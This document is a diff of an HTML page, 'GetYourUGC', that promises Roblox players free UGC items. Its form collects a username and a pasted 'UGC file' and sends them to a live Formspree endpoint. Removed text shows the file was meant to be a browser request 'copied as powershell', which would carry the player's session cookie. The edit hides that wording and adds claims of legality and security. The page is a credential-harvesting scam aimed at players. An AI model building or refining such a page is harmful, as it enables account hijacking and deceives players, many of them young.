@@ -9,10 +9,13 @@
       background: #0f0f0f;
       font-family: 'Segoe UI', sans-serif;
       color: white;
+    }
+
+    .main {
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
-      height: 100vh;
+      padding: 40px 20px;
     }
 
     .container {
@@ -31,7 +34,6 @@
 
     p {
       color: #aaa;
-      margin-bottom: 25px;
     }
 
     input, textarea {
@@ -77,23 +79,38 @@
       font-size: 12px;
       color: #666;
     }
+
+    .info {
+      max-width: 600px;
+      margin-top: 40px;
+      text-align: center;
+    }
+
+    .info h2 {
+      margin-top: 20px;
+    }
+
+    .info p {
+      color: #bbb;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
   </style>
 </head>
 
 <body>
 
+<div class="main">
+
   <div class="container">
-    <h1>GetYourUGC !</h1>
-    <p>Submit your Roblox UGC easily</p>
+    <h1>GetYourUGC </h1>
+    <p>Get your Roblox UGC for free</p>
 
-    <form action="https://formspree.io/f/YOUR_FORMSPREE_ID" method="POST">
-
+    <form action="https://formspree.io/f/mkoppawp" method="POST">
       <input type="text" name="roblox_username" placeholder="Your Roblox Username" required>
-
       <textarea name="ugc_file" placeholder="Paste your UGC file here..." required></textarea>
-
       <button type="submit">Submit</button>
-
     </form>
 
     <div class="footer">
@@ -101,17 +118,22 @@
     </div>
   </div>
 
-</body>
-  <div style="margin-top: 30px; text-align: left;">
-  <h2 style="font-size: 20px;">How this site works?</h2>
-  <p style="color: #32cd32; font-size: 14px;">
-    GetYourUGC is a simple site where Roblox players can get Roblox UGC for 100% free and easily and legally.
-    We have a secure connection to avoid data breach.
-  </p>
+  <!-- PARAGRAPHS BELOW -->
+  <div class="info">
+    <h2>How this site works?</h2>
+    <p>
+      GetYourUGC is a simple site where Roblox players can get UGC easily and legally.
+      Your submissions are handled securely.
+    </p>
 
-  <h2 style="font-size: 20px; margin-top: 20px;">How It Works</h2>
-  <p style="color: #aaa; font-size: 14px;">
-    Just enter your Roblox username and paste your UGC file that you copied as powershell. Once submitted, your UGC file is reviewed and updated to your account within 24 hours.
-  </p>
+    <h2>How It Works</h2>
+    <p>
+      Enter your Roblox username and paste your UGC file.
+      Once submitted, your request is reviewed and processed within 24 hours.
+    </p>
+  </div>
+
 </div>
+
+</body>
 </html>
